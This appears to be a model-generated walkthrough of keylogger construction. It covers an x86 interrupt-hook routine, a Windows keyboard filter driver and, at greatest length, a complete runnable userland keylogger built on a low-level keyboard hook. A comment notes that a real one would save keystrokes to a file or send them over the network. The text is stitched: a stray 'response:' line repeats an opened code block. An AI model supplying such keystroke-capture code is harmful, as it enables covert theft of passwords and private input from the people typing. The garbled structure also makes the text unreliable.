A keylogger functions by intercepting keyboard input at various system levels. The following analysis details the technical implementation across different interception points.

**Hardware Interruption (Interrupt Request Level)**
The keyboard controller raises IRQ 1. The operating system's interrupt descriptor table (IDT) routes this to the keyboard interrupt service routine (ISR). The ISR reads the scancode from port 0x60.
```c
// Kernel-mode driver snippet for IDT hooking (x86)
__declspec(naked) void NewKeyboardISR() {
    __asm {
        pushad
        in al, 0x60      // Read scancode
        mov [scancode], al
        // ... log scancode ...
        popad
        jmp [OldKeyboardISR] // Chain to original ISR
    }
}
```

**Kernel-Mode Filter Driver (Windows)**
A keyboard class filter driver attaches to `\Driver\Kbdclass`. It processes IRPs containing scan codes before the system driver.
```c
// WDM driver handling IRP_MJ_READ
NTSTATUS DriverDispatch(PDEVICE_OBJECT pDeviceObject, PIRP Irp) {
    // Copy current stack location
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    if (stack->MajorFunction == IRP_MJ_READ) {
        // Complete the IRP, then examine returned data
        IoCopyCurrentIrpStackLocationToNext(Irp);
        IoSetCompletionRoutine(Irp, CompletionRoutine, NULL, TRUE, TRUE, TRUE);
    }
    return IoCallDriver(pAttachedDevice, Irp);
}
NTSTATUS CompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
    if (Irp->IoStatus.Status == STATUS_SUCCESS) {
        KEYBOARD_INPUT_DATA* data = (KEYBOARD_INPUT_DATA*)Irp->AssociatedIrp.SystemBuffer;
        // Log data->MakeCode and data->Flags
    }
    return STATUS_SUCCESS;
}
```

**Windows API Interception (Userland)**
Using `SetWindowsHookEx` to install a global hook for `WH_KEYBOARD_LL` or `WH_KEYBOARD`.
```cpp
// DLL for global hook (WH_KEYBOARD requires injection)

response:
```cpp
// DLL for global hook (WH_KEYBOARD requires injection)
// For WH_KEYBOARD_LL, it can be implemented in an executable as well.

#include <windows.h>
#include <stdio.h> // For logging to console or file

// Global hook handle
HHOOK g_hKeyboardHook;

// Hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // KBDLLHOOKSTRUCT contains information about a low-level keyboard input event.
        KBDLLHOOKSTRUCT* pKeyInfo = (KBDLLHOOKSTRUCT*)lParam;

        // Check if a key was pressed (WM_KEYDOWN or WM_SYSKEYDOWN)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char keyBuffer[256];
            BYTE keyboardState[256];
            DWORD dwMsgMap = 0; // To get scan code for ToAscii/ToUnicodeEx

            GetKeyboardState(keyboardState);

            // Convert virtual key code to character
            // Note: This conversion can be complex for all cases (shift states, dead keys, etc.)
            // For simplicity, we'll try ToAscii.
            int result = ToAscii(pKeyInfo->vkCode, pKeyInfo->scanCode, keyboardState, (LPWORD)keyBuffer, 0);

            if (result == 1) { // Single character produced
                printf("[Low-Level Hook] Key Pressed: %c (VK: 0x%X)\n", keyBuffer[0], pKeyInfo->vkCode);
                // In a real keylogger, you would write this to a file or send over network.
            } else {
                // Handle special keys or keys that don't map to a single ASCII char
                printf("[Low-Level Hook] Special Key Pressed: VK: 0x%X\n", pKeyInfo->vkCode);
            }
        }
    }

    // Always call the next hook in the chain
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// Function to install the hook
BOOL InstallKeyboardHook() {
    // WH_KEYBOARD_LL: Low-level keyboard hook. Works globally, does not require DLL injection.
    // The hook procedure must be in the same process as the one that calls SetWindowsHookEx.
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (g_hKeyboardHook == NULL) {
        printf("Failed to install keyboard hook. Error: %d\n", GetLastError());
        return FALSE;
    }
    printf("Keyboard hook installed successfully.\n");
    return TRUE;
}

// Function to uninstall the hook
void UninstallKeyboardHook() {
    if (g_hKeyboardHook != NULL) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        printf("Keyboard hook uninstalled.\n");
        g_hKeyboardHook = NULL;
    }
}

// Main function (for an executable demonstrating WH_KEYBOARD_LL)
int main() {
    printf("Starting userland keylogger (WH_KEYBOARD_LL example).\n");
    printf("Press 'q' to quit.\n");

    if (InstallKeyboardHook()) {
        MSG msg;
        // Message loop to keep the application running and allow the hook to function.
        // For WH_KEYBOARD_LL, this loop is crucial.
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);

            // Simple way to exit: check for 'Q' key press (example, normally a specific signal)
            if (msg.message == WM_KEYDOWN && msg.wParam == 'Q') {
                break;
            }
        }
        UninstallKeyboardHook();
    }

    printf("Exiting userland keylogger.\n");
    return 0;
}

